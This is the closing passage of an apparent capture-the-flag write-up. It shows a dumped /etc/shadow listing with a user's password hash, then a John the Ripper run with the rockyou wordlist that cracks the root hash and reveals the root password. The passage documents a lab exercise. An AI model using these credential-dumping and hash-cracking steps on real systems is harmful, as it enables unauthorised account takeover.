</span></span><span style="display:flex;"><span>uucp:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>proxy:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>www-data:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>backup:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>list:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>irc:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>gnats:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>nobody:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-timesync:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-network:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-resolve:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-bus-proxy:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>syslog:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>_apt:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>messagebus:*:18277:0:99999:7:::
</span></span><span style="display:flex;"><span>uuidd:*:18277:0:99999:7:::
</span></span><span style="display:flex;"><span>papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
</span></span><span style="display:flex;"><span>Segmentation fault
</span></span></code></pre></div><p>I copied the root line into a hash.txt and cracked it with john to finish the CTF:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt
</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>sha512crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $6$ <span style="color:#f92672">[</span>SHA512 128/128 AVX 2x<span style="color:#f92672">])</span>
</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">5000</span> <span style="color:#66d9ef">for</span> all loaded hashes
</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
</span></span><span style="display:flex;"><span>love2fish        <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>     
</span></span><span style="display:flex;"><span>1g 0:00:02:07 DONE <span style="color:#f92672">(</span>2023-04-12 15:07<span style="color:#f92672">)</span> 0.007849g/s 1882p/s 1882c/s 1882C/s luciole..lossims
</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span>Session completed.
</span></span></code></pre></div><p>What is the root password! love2fish</p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
